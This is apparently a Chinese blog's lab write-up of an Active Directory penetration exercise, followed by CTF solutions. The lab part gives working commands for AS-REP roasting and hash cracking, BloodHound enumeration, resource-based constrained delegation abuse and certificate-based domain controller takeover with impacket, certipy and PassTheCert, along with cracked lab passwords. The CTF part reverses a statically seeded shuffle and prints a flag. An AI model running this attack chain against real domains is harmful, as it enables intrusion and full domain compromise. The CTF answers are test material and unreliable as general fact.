src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0aacbffd38cce8300312c13eb7afcf12.png"></p><p>root/root@#123</p><p>直接在这台机上<a href="http://localhost/phpmyadmin/%E5%B0%B1%E8%A1%8C">http://localhost/phpmyadmin/就行</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fc8162d2b65b40a35b2457811ded8988.png"></p><pre class="line-numbers language-none"><code class="language-none">proxychains4 xfreerdp /u:qaq /p:'Abcd1234' /v:172.22.15.24 /cert:ignore /sec:nla /tls-seclevel:0 /drive:share,/home/kalips:3389 是远程桌面（RDP, Remote Desktop Protocol）的默认端口。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>导出</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a86bc34d22e6e0a92f0902bd99bb7887.png"></p><p>也可以弱密码admin/123456进入后台再导密码</p><pre class="line-numbers language-none"><code class="language-none">admin@xiaorang.lablixiuying@xiaorang.lablixiaoliang@xiaorang.labzhangyi@xiaorang.labjiaxiaoliang@xiaorang.labzhangli@xiaorang.labzhangwei@xiaorang.labliuqiang@xiaorang.labwangfang@xiaorang.labwangwei@xiaorang.labwanglihong@xiaorang.labhuachunmei@xiaorang.labwanghao@xiaorang.labzhangxinyu@xiaorang.labhuzhigang@xiaorang.lablihongxia@xiaorang.labwangyulan@xiaorang.labchenjianhua@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用 GetNPUsers</p><pre class="line-numbers language-none"><code class="language-none">proxychains impacket-GetNPUsers -dc-ip 172.22.15.13 xiaorang.lab/ -usersfile user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出来了</p><pre class="line-numbers language-none"><code class="language-none">$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:f00b5bb99c26ee95c3a1ad04c72c86f1$8b0b067fca3492adcb3ccd3209cd32fe81cb7a9d746e497cc0413baf73cadb0160f582748e23d8490bc7b1b75555058f1ca4fc50433efa086e87a93d1c96a575fea8d906b1ec3954a2f2829e9d3766fb5116671e30a0d4142c0e7d55fd9ba41e5fea148a6d5f0cda7a79b185b8c69d47c0e9fee1acad117264356958f3250c6e1a735026df219fa37a69e1ebdef69794f4d6e4b8450b94ba65407037d3d27f7c847908536cc5eaede85eb3bfb021c8ba92a67553e1bbdc3ea76020ca4a6e97d58d544da554e4aa656864bed0a509ed6be1d668056d5a9ab8f4c7c3049123a54e81b689b8f5933d029de07bb7$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:de723d749e3f0dccd5d118f272ef3a19$29014587bdcc4c2dfa5363a66bee0d3abe14a32d1e598cf21c049d50ae5ce468ab1b0a2016fcfc1e6f432235fb8c79eb09f119b9c04f01447d8950ec0ec1339c49c8207594fdcfa8363f739652639640dc24632cac97b8451ee3d3d8d69d519e787747ab502c3d1c7b2a38abb61a03998dc36b2cc662f7595901fcc3685c0e4524dc1b0712118bb2bc161f6f79451da3f70d54cbcfb3e4ef583d9205963597ad97795daa32c8a8dff9b9d8baf54d6b31119e47254704117e79a7da8598d28fb2176fe7e1d01c5780743126fc511973cbfc8dd6daf0fcfaaa80bb85b7af9f194e99c9681c9f80972353220ad5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Kerberos AS-REP 哈希 (<code>$krb5asrep$</code>) John 处理得更好，几乎不依赖 GPU。</p><pre class="line-numbers language-none"><code class="language-none">john --format=krb5asrep hash.txt --wordlist=/usr/share/wordlists/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">john --show hash.txt$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:1qaz2wsx$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:winniethepoohlixiuying:winniethepoohhuachunmei:1qaz2wsx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登<code>172.22.15.35</code></p><pre class="line-numbers language-none"><code class="language-none">proxychains4 xfreerdp /u:lixiuying /p:'winniethepooh' /v:172.22.15.35 /cert:ignore /sec:nla /tls-seclevel:0 /drive:share,/home/kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看一下Bloodhound</p><pre class="line-numbers language-none"><code class="language-none">proxychains bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fcec56d1d3fb4052ba66a8c5ed7240d4.png"></p><h5 id="第一条链：RBCD-提权（基于-GenericWrite）"><a href="#第一条链：RBCD-提权（基于-GenericWrite）" class="headerlink" title="第一条链：RBCD 提权（基于 GenericWrite）"></a>第一条链：RBCD 提权（基于 GenericWrite）</h5><p><code>GenericWrite</code> 说明此用户可以<strong>修改该计算机账户的某些属性（比如 RBCD 委派配置）</strong>，这是域内提权的重要入口。</p><p><a href="https://ya1orin.github.io/posts/32b1aa46">域渗透中可滥用权限及其应用 | Ya1orin🍭</a></p><p><code>LIXIUYING@XIAORANG.LAB</code> 对 <code>XR-0687.XIAORANG.LAB</code> 有 GenericWrite 的权限。打 RBCD（资源基于约束委派）</p><p>加一个机器用户</p><p>在 <strong>域控 (172.22.15.13)</strong> 上添加一台“虚拟机器账户 01$”， 并不是直接在 172.22.15.35（XR-0687）上操作。（所以是172.22.15.13）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">proxychains impacket<span class="token operator">-</span>addcomputer <span class="token operator">-</span>method SAMR xiaorang<span class="token punctuation">.</span>lab<span class="token operator">/</span>lixiuying<span class="token punctuation">:</span>winniethepooh <span class="token operator">-</span>computer<span class="token operator">-</span>name <span class="token number">01</span>\$ <span class="token operator">-</span>computer<span class="token operator">-</span><span class="token keyword">pass</span> Abcd1234 <span class="token operator">-</span>dc<span class="token operator">-</span>ip <span class="token number">172.22</span><span class="token number">.15</span><span class="token number">.13</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>使用 <strong>SAMR 协议</strong>来添加计算机账户。</p><p><strong>computer-name 01$</strong></p><ul><li>添加的计算机账户名，注意末尾的 <code>$</code> 是域控要求的形式。</li><li>在 Windows AD 中，计算机账户名字通常以 <code>$</code> 结尾。</li><li><code>-dc-ip</code> 永远是域控 IP</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e30895038ac7d68df036591cc6f7c169.png"></p><p><a href="https://github.com/shigophilo/tools/blob/master/PowerView.ps1">tools/PowerView.ps1 at master · shigophilo/tools (github.com)</a></p><p>传个PowerView.ps1</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">PS C:\Users\lixiuying\Desktop\<span class="token number">1</span><span class="token operator">&gt;</span> <span class="token keyword">Import</span><span class="token operator">-</span>Module <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1PS C:\Users\lixiuying\Desktop\<span class="token number">1</span><span class="token operator">&gt;</span> Get<span class="token operator">-</span>NetComputer <span class="token number">01</span> <span class="token operator">-</span>Properties objectsidobjectsid<span class="token comment">---------</span>S<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span><span class="token operator">-</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">3745972894</span><span class="token operator">-</span><span class="token number">1678056601</span><span class="token operator">-</span><span class="token number">2622918667</span><span class="token operator">-</span><span class="token number">1151</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导入 PowerView 模块，让你可以使用一系列 AD 枚举函数。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-NetComputer</span> 01 <span class="token operator">-</span>Properties objectsid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Get-NetComputer 用于查询 域内计算机账户信息。</p><p>01 是计算机名（你刚用 Impacket 创建的那个计算机账户）。</p><p>-Properties objectsid 表示只查询 objectSID 属性。</p><p><code>S-1-5-21-3745972894-1678056601-2622918667</code> → 域的唯一标识符</p><p><code>1151</code> → 计算机账户在域内的 <strong>相对标识符（RID）</strong></p><p>这个 SID 表示 <strong>计算机账户 01$ 已成功在域中创建</strong></p></blockquote><p> 构造 RBCD ACL，修改服务资源msDS-AllowedToActOnBehalfOfOtherIdentity属性</p><pre class="line-numbers language-none"><code class="language-none">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3745972894-1678056601-2622918667-1151)";$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer XR-0687 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>Set-DomainObject -Set @{‘msds-allowedtoactonbehalfofotheridentity’=$SDBytes}</strong></p><ul><li>给这个计算机对象设置 <strong>RBCD 属性</strong></li><li>意思是：允许 <strong>指定 SID（你的计算机账户）</strong> 代表 <code>XR-0687</code> 发起 Kerberos 委派</li></ul></blockquote><p>之前创建的计算机账户（SID=1151）现在可以 <strong>在 Kerberos 上代表 XR-0687 执行身份委派操作</strong>。</p><blockquote><p>它修改的是 <strong>目标机器 XR-0687 的 ACL 属性</strong>，并不是给机器账户 01$ 增加了能力，而是 <strong>在 XR-0687 上登记了一条“谁可以冒充”的名单</strong>。</p><blockquote><p>你理解成“机器账户 01$ 获得了能力”没错，但从 AD 的角度，它是通过 <strong>修改目标机器 XR-0687 的委派白名单</strong> 来实现的。</p></blockquote></blockquote><p>典型用途：<strong>RBCD 权限提升</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2c19468b8fd69aa61fe884159badad93.png"></p><p>创建票据</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">proxychains impacket<span class="token operator">-</span>getST xiaorang<span class="token punctuation">.</span>lab<span class="token operator">/</span><span class="token number">01</span>\$<span class="token symbol">:Abcd1234</span> <span class="token operator">-</span>spn cifs<span class="token operator">/</span><span class="token constant">XR</span><span class="token operator">-</span><span class="token number">0687.</span>xiaorang<span class="token punctuation">.</span>lab <span class="token operator">-</span>impersonate administrator <span class="token operator">-</span>dc<span class="token operator">-</span>ip <span class="token number">172.22</span><span class="token number">.15</span><span class="token number">.13</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Saving ticket <span class="token keyword">in</span> administrator<span class="token variable">@cifs_XR</span><span class="token operator">-</span><span class="token number">0687.</span>xiaorang<span class="token punctuation">.</span>lab<span class="token variable">@XIAORANG</span><span class="token punctuation">.</span><span class="token constant">LAB</span><span class="token punctuation">.</span>ccache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><code>impacket-getST</code>：用来获取 Kerberos 服务票据（Service Ticket，简称 ST）。</p><p><code>xiaorang.lab/'01$':'Abcd1234'</code>：使用我们添加的伪造机器账户登录。</p><p><code>-spn cifs/XR-0687.xiaorang.lab</code>：指定服务 SPN（这里是 CIFS 服务，对应文件共享/SMB）。</p><p><code>-impersonate Administrator</code>：冒充 Administrator。</p><p><code>-dc-ip 172.22.15.13</code>：域控 IP。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ddd5e971ddf1d0245de15e05af1f7fee.png"></p><p>导入票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccacheproxychains impacket-wmiexec <span class="token parameter variable">-k</span> -no-pass XIAORANG.LAB/administrator@XR-0687.xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13klist <span class="token parameter variable">-c</span> administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>KRB5CCNAME 指定 Kerberos 票据缓存文件</p><p>这里你把之前 impacket-getST 保存的 Administrator TGS 设置为当前会话使用</p><p>后续 Kerberos 命令或 Impacket 工具会自动使用这个票据</p><p><code>impacket-wmiexec</code> → 利用 <strong>WMI(Remote Management)</strong> 远程执行命令</p><p><code>-k</code> → 使用 <strong>Kerberos 认证</strong></p></blockquote><p>利用 <strong>RBCD + Kerberos TGS</strong> 权限，在 XR-0687 上以 <strong>Administrator 身份</strong>执行命令</p><p>注意bug：这里如果重复了，重新创建一个TEST用户</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5cc9b7b1ba5c004671a725a78c9f0abc.png"></p><hr><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><h5 id="第二条链：证书滥用-PassTheCert"><a href="#第二条链：证书滥用-PassTheCert" class="headerlink" title="第二条链：证书滥用 + PassTheCert"></a>第二条链：证书滥用 + PassTheCert</h5><pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad zaccount create lixiuying@xiaorang.lab -p winniethepooh -dc -ip 172.22.15.13 -user Test2 -pass Test1234 dns 'XR-DC01.xiaorang.lab'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>zaccount create</code></p><ul><li>创建一个 <strong>Zaccount（证书账户对象）</strong></li><li>在 AD 中，这类账户可以用于 <strong>Kerberos 证书认证（PKINIT）</strong></li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f5faafb44607538d99c9352da11d77da.png"></p><p>找到可以签发证书的 CA（证书颁发机构）。用 certipy 先枚举一遍可利用的证书模版</p><pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/eaf82e87f849ee5f44e807d4894a2790.png"></p><p>（这里有点问题）</p><p>1.用 <strong>lixiuying</strong> 登录域控制器</p><p>2.Certipy 查询 AD 中的 <strong>证书对象、Zaccount 或 SPN 信息</strong></p><p>返回结果可以用来：</p><ul><li>确认目标账户是否存在可用 Kerberos PKINIT</li><li>找到可利用的服务主体进行票据获取或攻击</li></ul><p>按流程，用该机器账户向 XR-CA 请求证书</p><pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad req -u Tests2\$@xiaorang.lab -p Test1234 -target 172.22.15.18 -ca "xiaorang-XR-CA-CA" -template Machine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>-ca “xiaorang-XR-CA-CA”</strong><br> 指定证书颁发机构（CA）的名字。</p><p><strong>-template Machine</strong><br> 指定证书模板为 <strong>Machine</strong>，这是默认的计算机认证模板，通常用于计算机账户申请 Kerberos 证书。</p><p><strong>certipy-ad req</strong><br> Certipy 的 <code>req</code>（request）模块，用于向 CA 申请证书。</p><p><strong>-u Tests2$@xiaorang.lab</strong><br> 这是一个 <strong>机器账户（Computer Account）</strong>，注意 <strong><code>\$</code> 结尾表示计算机账户</strong>。<br> 用户名是 <code>Tests2$</code>，域是 <code>xiaorang.lab</code>。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4068da2eea4f1703a35f605ad6654817.png"></p><blockquote><p>在申请 TGT 的时候出现了问题</p><pre class="line-numbers language-none"><code class="language-none">$ proxychains certipy auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13Certipy v4.7.0 - by Oliver Lyak (ly4k)[*] Using principal: xr-dc01$@xiaorang.lab[*] Trying to get TGT...[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code>(<strong>域控没启用 PKINIT</strong>。)</p></blockquote><p><strong>这个域控不支持 Kerberos PKINIT（智能卡/TLS 证书登录）</strong>，所以 Certipy 用证书申请 TGT 会失败。</p><p>所以用 Schannel 替代 PKINIT</p><p><a href="https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/">Pass The Certificate when PKINIT Padata Type is NOSUPP | WHOAMI</a></p><p>首先得把pfx导出为.key 和.crt 两个文件(让你输入密码直接回车即可，空密码)：</p><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">certipy<span class="token operator">-</span>ad cert <span class="token operator">-</span>pfx xr<span class="token operator">-</span>dc01<span class="token punctuation">.</span>pfx <span class="token operator">&gt;</span> cert<span class="token punctuation">.</span>pemopenssl pkcs12 <span class="token operator">-</span><span class="token keyword">in</span> cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>keyex <span class="token operator">-</span>CSP <span class="token string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="token operator">-</span>export <span class="token operator">-</span>out cert<span class="token punctuation">.</span>pfxopenssl rsa <span class="token operator">-</span><span class="token keyword">in</span> cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>out test<span class="token punctuation">.</span>keyopenssl x509 <span class="token operator">-</span><span class="token keyword">in</span> cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>out test<span class="token punctuation">.</span>crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>Certipy 导出的 <code>.pfx</code> 格式默认是 PKCS#12</strong>，但它没有指定 Windows 所需的 <strong>CSP (Cryptographic Service Provider)</strong>，<br> 导致在 Windows MMC 导入时，可能会提示：</p><ul><li>“无法导入此证书”</li><li>“私钥不可导出”</li><li>或 RDP、Rubeus 识别失败。</li></ul><p><strong>转成 <code>.pem</code> 再转回 <code>.pfx</code></strong> 的目的是：</p><ul><li>重新封装成 <strong>带 Key Exchange 标志 (<code>-keyex</code>) 且 Windows 认可的 PFX</strong>。</li><li>加入 <code>-CSP "Microsoft Enhanced Cryptographic Provider v1.0"</code>，确保兼容 RDP / SChannel / Kerberos PKINIT。</li></ul></blockquote><p><a href="https://github.com/AlmondOffSec/PassTheCert/">https://github.com/AlmondOffSec/PassTheCert/</a></p><p>用 Schannel 方式验证证书能否登录域控 (whoami)</p><pre class="line-numbers language-vbnet" data-language="vbnet"><code class="language-vbnet">cd ~<span class="token operator">/</span>PassTheCert<span class="token operator">/</span>Pythonproxychains python3 passthecert.py <span class="token operator">-</span>action whoami <span class="token operator">-</span>crt test.crt <span class="token operator">-</span><span class="token keyword">key</span> test.<span class="token keyword">key</span> <span class="token operator">-</span>domain xiaorang.lab <span class="token operator">-</span>dc<span class="token operator">-</span><span class="token function">ip</span> <span class="token number">172.22</span><span class="token number">.15</span><span class="token number">.13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f88eb0ab845a557e00af8fdb3dab33c1.png"></p><p>下一步将证书配置到域控的 RBCD， <strong>用 PassTheCert 通过 Schannel 修改 RBCD</strong>，通过证书身份验证，以 <code>TEST2$</code> 机器账户身份写 RBCD，把它委派到 <code>XR-DC01</code> 域控。</p><pre class="line-numbers language-none"><code class="language-none">proxychains python3 passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to 'XR-DC01$' -delegate-from 'TEST2$'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>让 TEST2 机器账户可以代表自己请求 XR-DC01 的服务票据 (S4U2Self + S4U2Proxy)</strong>，从而伪造一个 DC 级别的 TGS，实现提权</p><p>接下来和之前一样申请ST</p><pre class="line-numbers language-none"><code class="language-none">proxychains impacket-getST xiaorang.lab/'TEST2$':'P@ssw0rd' -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13proxychains impacket-getST \    xiaorang.lab/'TEST2$':'P@ssw0rd' \    -spn cifs/XR-DC01.xiaorang.lab \    -impersonate Administrator \    -dc-ip 172.22.15.13 \    -save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>为什么有时候只生成 <code>Administrator.ccache</code>？</p><ul><li>旧版 Impacket 默认不启用 <code>-save</code>，只简单用模拟账户名命名。</li><li>新版才会根据 <strong><code>&lt;impersonate&gt;@&lt;spn&gt;@&lt;domain&gt;</code></strong> 自动拼出全名。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4825c4a5de2409d1d6136301706ecc09.png"></p><pre class="line-numbers language-none"><code class="language-none"># hosts 文件信息​└─# cat /etc/hosts172.22.15.35 XR-0687.xiaorang.lab172.22.15.13 XR-DC01.xiaorang.lab172.22.15.18 XR-CA.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来导入申请的票据，最后连接即可</p><pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=Administrator.ccacheexport KRB5CCNAME=Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccacheproxychains -q impacket-psexec -k -no-pass -dc-ip 172.22.15.13 administrator@XR-DC01.xiaorang.lab -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者利用 whoami 师傅的工具，通过证书认证到 LDAPS，添加机器账户 HACK03，并设置 HACK03 到域控制器 XR-DC01 的 RBCD</p><pre class="line-numbers language-none"><code class="language-none">PassTheCertificate.exe -CertPath .\cert.pfx -MachineAccount HACK03$ -MachinePassword Qwer1234 -Target "CN=XR-DC01,OU=Domain Controllers,DC=xiaorang,DC=lab"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>prize</title>
      <link href="/2025/08/31/prize25/"/>
      <url>/2025/08/31/prize25/</url>
      
        <content type="html"><![CDATA[<h2 id="grandmas-notes"><a href="#grandmas-notes" class="headerlink" title="grandmas_notes"></a>grandmas_notes</h2><p>看源码可知会提示密码前几位的正确性。burp攻击，记得开重定向，减缓攻击速度，即可爆出admin密码。</p><p><code>abcdefghijklmnopqrstuvwxyz0123456789ZAQWSXCDERFVBGTYHNMJUIKLOP</code></p><p>belike<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b9a8cb169b5ccf9e855419f4a9ae99f3.png"></p><p>最后是<code>YzUnh2ruQix9mBWv</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c639b8e290761c78abf947357942bb90.png"></p><hr><h2 id="pwgen"><a href="#pwgen" class="headerlink" title="pwgen"></a>pwgen</h2><p>deepseek秒了</p><p>先访问 <code>/?nthpw=1</code>拿到一个字符串</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 将打乱后的字符串粘贴在这里</span><span class="token variable">$shuffled</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"7F6_23Ha8:5E4N3_/e27833D4S5cNaT_1i_O46STLf3r-4AH6133bdTO5p419U0n53Rdc80F4_Lb6_65BSeWb38f86{dGTf4}eE8__SW4Dp86_4f1VNH8H_C10e7L62154"</span><span class="token punctuation">;</span><span class="token variable">$L</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shuffled</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 初始化随机种子</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0x1337</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 记录对于每个 i 从 L-1  down to 1 的 j_i 值</span><span class="token variable">$j_values</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token variable">$L</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$j_values</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$j</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 将打乱后的字符串转换为数组</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">str_split</span><span class="token punctuation">(</span><span class="token variable">$shuffled</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 逆交换过程：对于 i 从 1 到 L-1</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$L</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$j_values</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 交换位置 i 和 j</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$original</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$original</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>        #ENO{N3V3r_SHUFFLE_W1TH_STAT1C_S333D_OR_B4D_TH1NGS_WiLL_H4pp3n:-/_0d68ea85d88ba14eb6238776845542cf6fe560936f128404e8c14bd5544636f7}    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="逆转原理"><a href="#逆转原理" class="headerlink" title="逆转原理"></a>逆转原理</h3><ol><li><strong>打乱过程</strong>：PHP的<code>str_shuffle</code>函数内部使用<code>rand()</code>生成随机索引来交换字符位置。对于长度为L的字符串，打乱过程从最后一个字符（索引L-1）开始向前遍历到第二个字符（索引1），对于每个位置i，生成一个随机索引j（0 ≤ j ≤ i），然后交换位置i和j的字符。</li><li><strong>逆转过程</strong>：由于随机种子固定，我们可以重现相同的随机序列（即每个i对应的j值）。为了还原打乱，我们需要以相反的顺序应用相同的交换操作。即从i=1到i=L-1（递增顺序）进行交换，每次交换位置i和存储的j值对应的位置。这样逐步还原每次交换，最终得到原始字符串。</li></ol><h3 id="步骤解释"><a href="#步骤解释" class="headerlink" title="步骤解释"></a>步骤解释</h3><ul><li>首先，通过访问<code>/?nthpw=1</code>获取打乱后的字符串（例如：<code>Your password is: '打乱后的字符串'</code>）。</li><li>然后，使用提供的PHP脚本逆转打乱过程：<ul><li>脚本设置相同的随机种子（<code>srand(0x1337)</code>）。</li><li>生成随机序列（j_values），存储每个i对应的j值（i从L-1 down to 1）。</li><li>将打乱后的字符串转换为数组。</li><li>从i=1到i=L-1循环，每次交换位置i和j_values[i]的字符。</li><li>最终输出还原后的原始flag。</li></ul></li></ul></blockquote><h2 id=""><a 